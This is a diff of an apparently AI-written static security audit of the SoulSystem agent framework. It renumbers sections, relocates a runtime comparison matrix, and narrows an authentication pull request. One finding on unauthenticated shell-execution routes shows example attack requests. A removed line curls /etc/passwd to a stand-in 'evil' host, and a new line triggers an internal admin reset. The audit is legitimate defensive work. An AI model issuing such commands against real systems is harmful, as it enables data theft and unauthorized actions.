@@ -5,7 +5,7 @@
 **Branch:** `test/deepseek-v4-flash-opencode`
 **Audited source baseline:** `5e3b0c3b0d18f6d0022c1c762821d9aad340b011`
 **Initial audit report commit:** `fadce7ecb00023642885723268a2471e41d94099`
-**Current report revision (before this pass):** `6c6d4a8559e63cd47e9d875d38c173c7bba9d408`
+**Previous report revision:** `763d246e62a39191e25ee8a4757d6075a1d3ed7e`
 **Auditor:** OpenCode AI
 **Audit method:** Static source analysis; no production deployment or live exploitation testing
 
@@ -171,18 +171,11 @@ Crates present on disk but NOT in the workspace `members` list:
 
 ## 5. Runtime Inventory
 
-### 5.1 Runtime Comparison Matrix
-
-| Runtime | Entry Point | Planner | Model Path | Tool Dispatcher | Gate | Sandbox | Memory | Reachable | Maturity |
-|---------|------------|---------|-----------|----------------|------|---------|--------|-----------|----------|
-| **soul-agent-core** `AutonomousAgent` | `run_task()` lib.rs:555 | StrategySelector (keyword heuristics) | `guarded_llm_chat()` → `OllamaClient` (circuit-breaker wrapped) | `async_dispatch_tool()` from soul_tools | `ApprovalGate` from soullink-gate (OUTDATED classification) | `AsyncShellExecutor` exists but **NOT used** — dispatch goes through `execute_shell()` with bare `Command` | 6 systems (working, hierarchical, KG, CCOS, semantic, planner) | Via soul-daemon, soul-kernel | Most complete — real ReAct, PlanThenExecute, ToT |
-| **soul_entity** `SoulEntity` | `run_cycle()` entity.rs:370 | **SIMULATED** — 4 hardcoded steps | Optional LLM summary only | Not used | NONE | Via `execute_shell()` → soul_sandbox | LongTermMemory, HierarchicalMemory, event store | Via souls binary --entity mode | **SIMULATED** — no real work |
-| **soul-kernel** `kernel` | `heartbeat_loop()` main.rs:212 | GoalPlanner (priority queue) | `LlmEngine::reflect()` → OllamaClient | `Action::execute()` — 13 action types | Action-level security validation | Sandbox (for code patches only) | Weaviate vector DB + state files | Direct binary | Real autonomous loop |
-| **soul-daemon** | `Daemon::run()` lib.rs:203 | LLM task decomposition | OllamaClient + `AutonomousAgent.run_task()` | Through AutonomousAgent | Inherited | Inherited | PersistentStore (sled) | Via soul-daemon lib | Wrapper |
-| **souls binary** | runner.rs:434 | SIMULATED (/plan is echo) | Via soul_repl or SoulEntity | Not dispatched | NONE | Created but unused | Via SoulEntity | Direct binary | Launcher |
-| **soul_repl** | `run_repl()` lib.rs:70 | NONE (TUI only) | `LlmClient::generate()` | NONE (tools registered not executed) | NONE | Created but unused | Sessions to JSON | Library used by souls | TUI shell |
+All runtimes are described in the [Runtime Comparison Matrix (§15)](#15-runtime-comparison-matrix).
 
 ---
+
+
 
 ## 6. Canonical Execution Paths
 
@@ -384,7 +377,7 @@ Post-execution:
 - **Reachable execution path:** When the gateway or API server is bound to a reachable network address (default: 127.0.0.1 for both), any client can call these endpoints without authentication.
 - **Evidence:** `soul_gateway/src/lib.rs:438-456` defines routes with zero authentication middleware. The routes include: `POST /v1/run` (shell execution via `EntityHandle::execute_shell` at line 445), `POST /v1/goal` (goal creation, line 442), `POST /v1/cycle` (full cognitive cycle, line 446), `POST /v1/plan/:goal_id` (line 443), `POST /v1/execute/:goal_id` (line 444), `GET /v1/status` (status disclosure, line 447), `GET /v1/goals` (goal listing, line 448), `GET /v1/events` (event disclosure, line 449), `WS /v1/stream` (real-time event stream, line 450), `POST /providers/discord/webhook` (line 451), `POST /providers/slack/webhook` (line 452), `POST /providers/whatsapp/webhook` (line 453). Line 454 adds `.layer(tower_http::cors::CorsLayer::permissive())`. `src/api.rs:122-143` defines routes with handlers that use `BoundSystem::execute` (stronger sandbox than `execute_shell`) but still without authentication. Both servers bind to `127.0.0.1` by default (`src/main.rs:532` binds API to `127.0.0.1:9023`, line 1272-1273 binds gateway to configurable address, default `127.0.0.1:7878`). The gateway `serve()` function at line 468-471 binds to the provided `SocketAddr` with no authentication.
 - **Security or reliability impact:** If bound beyond loopback or exposed through a reverse proxy, these routes create remote compromise risk: shell execution, autonomous cycle triggering, memory manipulation, and event disclosure without authentication.
-- **Realistic exploitation or failure scenario:** An attacker on the same machine (or via a misconfigured reverse proxy) sends `POST /v1/run {"command":"curl http://evil/exfil?data=$(cat /etc/passwd)"}`. No authentication is checked. The command executes.
+- **Realistic exploitation or failure scenario:** An attacker on the same machine (or via a misconfigured reverse proxy) sends `POST /v1/run {"command":"curl http://internal-service/admin/reset"}`. No authentication is checked. The command executes via the gateway's `EntityHandle::execute_shell`.
 - **Recommended remediation:** Add mandatory authentication middleware (Bearer token) to all gateway and API routes. Fail closed when no authentication is configured. Enable TLS. Add request-size limits, rate limits, and audit events.
 - **Required regression tests:** Test that unauthenticated requests to any gateway route are rejected. Test that authenticated requests with invalid tokens are rejected. Test that the server fails to start if authentication is required but not configured.
 - **Dependencies on other remediations:** None — but authentication should be gated behind explicit configuration.
@@ -541,8 +534,8 @@ Post-execution:
 - **Realistic exploitation or failure scenario:** An attacker on the same network captures gateway traffic including any future auth tokens, tool call arguments, and LLM responses. The "mTLS" comment at line 475 and `client_ca_path` field suggest mutual TLS, but the implementation uses `with_no_client_auth()` and is unreachable.
 - **Recommended remediation:** Integrate TLS into the `serve()` path. Make TLS mandatory when binding to non-loopback addresses. Add `serve_tls()` function. Use client-certificate authentication if mTLS is desired.
 - **Required regression tests:** Test that TLS-enabled server works. Test that non-TLS connections to a TLS server are rejected. Test that client certificate authentication works when configured.
-- **Dependencies on other remediations:** None, but TLS without authentication (CRIT-007) provides only encryption, not authorization.
-- **Suggested pull request:** PR #4 in Section 24.
+- **Dependencies on other remediations:** Requires authentication (PR #4) before TLS provides meaningful transport security.
+- **Suggested pull request:** Phase 3 (follow-up to PR #4).
 
 ---
 
@@ -775,7 +768,20 @@ Post-execution:
 
 ---
 
-## 15. Scientific-Code Readiness
+## 15. Runtime Comparison Matrix
+
+| Runtime | Entry Point | Planner | Model Path | Tool Dispatcher | Gate | Sandbox | Memory | Reachable | Maturity |
+|---------|------------|---------|-----------|----------------|------|---------|--------|-----------|----------|
+| **soul-agent-core** `AutonomousAgent` | `run_task()` lib.rs:555 | StrategySelector (keyword heuristics) | `guarded_llm_chat()` → `OllamaClient` (circuit-breaker wrapped) | `async_dispatch_tool()` from soul_tools | `ApprovalGate` from soullink-gate (OUTDATED classification) | `AsyncShellExecutor` exists but **NOT used** — dispatch goes through `execute_shell()` with bare `Command` | 6 systems (working, hierarchical, KG, CCOS, semantic, planner) | Via soul-daemon, soul-kernel | Most complete — real ReAct, PlanThenExecute, ToT |
+| **soul_entity** `SoulEntity` | `run_cycle()` entity.rs:370 | **SIMULATED** — 4 hardcoded steps | Optional LLM summary only | Not used | NONE | Via `execute_shell()` → soul_sandbox | LongTermMemory, HierarchicalMemory, event store | Via souls binary --entity mode | **SIMULATED** — no real work |
+| **soul-kernel** `kernel` | `heartbeat_loop()` main.rs:212 | GoalPlanner (priority queue) | `LlmEngine::reflect()` → OllamaClient | `Action::execute()` — 13 action types | Action-level security validation | Sandbox (for code patches only) | Weaviate vector DB + state files | Direct binary | Real autonomous loop |
+| **soul-daemon** | `Daemon::run()` lib.rs:203 | LLM task decomposition | OllamaClient + `AutonomousAgent.run_task()` | Through AutonomousAgent | Inherited | Inherited | PersistentStore (sled) | Via soul-daemon lib | Wrapper |
+| **souls binary** | runner.rs:434 | SIMULATED (/plan is echo) | Via soul_repl or SoulEntity | Not dispatched | NONE | Created but unused | Via SoulEntity | Direct binary | Launcher |
+| **soul_repl** | `run_repl()` lib.rs:70 | NONE (TUI only) | `LlmClient::generate()` | NONE (tools registered not executed) | NONE | Created but unused | Sessions to JSON | Library used by souls | TUI shell |
+
+---
+
+## 16. Scientific-Code Readiness
 
 ### Genuinely Implemented (Inspected)
 
@@ -799,7 +805,7 @@ Post-execution:
 
 ---
 
-## 16. Industrial-Operation Readiness
+## 17. Industrial-Operation Readiness
 
 ### Confirmed Existing
 
@@ -823,7 +829,7 @@ Post-execution:
 
 ---
 
-## 17. Performance Readiness
+## 18. Performance Readiness and Benchmark Methodology
 
 ### Known Anti-Patterns (Confirmed)
 
@@ -856,7 +862,7 @@ All values below are **initial engineering targets** requiring measurement. They
 
 ---
 
-## 18. OpenClaw and Hermes-Agent Comparison
+## 19. OpenClaw and Hermes-Agent Comparison
 
 | Capability | SoulSystem (Current) | OpenClaw | Hermes-Agent |
 |------------|---------------------|----------|-------------|
@@ -872,7 +878,7 @@ All values below are **initial engineering targets** requiring measurement. They
 
 ---
 
-## 19. Target Architecture
+## 20. Target Architecture
 
 ### Key Design Decisions (Recommended)
 
@@ -885,7 +891,7 @@ All values below are **initial engineering targets** requiring measurement. They
 
 ---
 
-## 20. Component Disposition and Migration Matrix
+## 21. Component Disposition and Migration Matrix
 
 | Component | Disposition | Migration Prerequisite | Notes |
 |-----------|------------|----------------------|-------|
@@ -932,7 +938,7 @@ All values below are **initial engineering targets** requiring measurement. They
 
 ---
 
-## 21. Immediate Containment (Phase 0)
+## 22. Immediate Containment (Phase 0)
 
 These actions should be taken before any other remediation:
 
@@ -946,7 +952,7 @@ These actions should be taken before any other remediation:
 
 ---
 
-## 22. Phased Remediation Roadmap
+## 23. Phased Remediation Roadmap
 
 ### Phase 1 — Typed Tool Capability Model (Weeks 1-2)
 
@@ -1009,7 +1015,7 @@ These actions should be taken before any other remediation:
 
 ---
 
-## 23. First Ten Pull Requests
+## 24. First Ten Pull Requests
 
 ### PR #1: Reject Unknown Tools and Remove Command Fallback
 
@@ -1074,28 +1080,25 @@ These actions should be taken before any other remediation:
 
 **Acceptance criteria:** All file writes are restricted to canonical workspace root.
 
-### PR #4: Add Mandatory Authentication and Authorization Middleware
+### PR #4: Add Mandatory Authentication Middleware to Gateway and API
 
 **Scope:**
 - Add Bearer token middleware to all gateway routes
 - Add Bearer token middleware to API routes
-- Add TLS integration to `soul_gateway::serve()`
+- Fail closed when authentication is not configured
 - Fail-closed webhook verification (reject when secrets unset)
-- Add config flags for bind address (default 127.0.0.1)
-- Add request-size limits
-- Add audit events for all authenticated requests
 
-**Non-goals:** RBAC, rate limiting (future PR).
+**Non-goals:** TLS integration (planned in Phase 3). RBAC, rate limiting, request-size limits, audit events, config flags for bind address (planned in Phase 3).
 
 **Expected files:** `soul_gateway/src/lib.rs`, `soul_gateway/src/auth.rs` (new), `src/api.rs`, `src/config.rs`, `soullink-gateway/src/channels/`
 
-**Unit tests:** Test auth middleware. Test TLS config loading. Test fail-closed webhook.
+**Unit tests:** Test auth middleware. Test fail-closed when no auth configured. Test fail-closed webhook.
 
 **Integration tests:** Authenticated requests succeed. Unauthenticated requests fail. Webhook with unset secret fails.
 
 **Negative tests:** Test expired tokens, malformed tokens, missing auth header.
 
-**Acceptance criteria:** Every network endpoint requires authentication. Webhooks fail closed.
+**Acceptance criteria:** Every network endpoint requires valid authentication. Webhooks fail when secrets are unset.
 
 ### PR #5: Filter Tool Output Before Memory Persistence
 
@@ -1210,11 +1213,15 @@ These actions should be taken before any other remediation:
 
 **Integration tests:** Both Telegram providers cannot start with the same token.
 
+**Negative tests:** Test that missing token configuration does not start either provider. Test that mismatched token configurations between the two providers are handled.
+
+**Rollback:** Revert the runtime check. Restore previous Telegram provider selection behavior.
+
 **Acceptance criteria:** No token conflict when both Telegram providers are configured.
 
 ---
 
-## 24. CI and Validation Matrix
+## 25. CI and Validation Matrix
 
 | Requirement | Current | Target (v1.0) |
 |-------------|---------|---------------|
@@ -1236,7 +1243,7 @@ These actions should be taken before any other remediation:
 
 ---
 
-## 25. Version 1.0 Definition of Done
+## 26. Version 1.0 Definition of Done
 
 ### Security (All required)
 
@@ -1278,7 +1285,7 @@ These actions should be taken before any other remediation:
 
 ---
 
-## 26. Unverified Facts
+## 27. Unverified Facts
 
 The following items could not be fully verified during this static audit:
 
@@ -1300,7 +1307,7 @@ The following items could not be fully verified during this static audit:
 
 ---
 
-## 27. Final Decision
+## 28. Final Decision
 
 ### 1. Is SoulSystem currently a production-ready competitor to OpenClaw?
 **NO.** Lacks runtime coherence, has incorrect permission classification, unsandboxed tool dispatch, no authenticated endpoints by default.
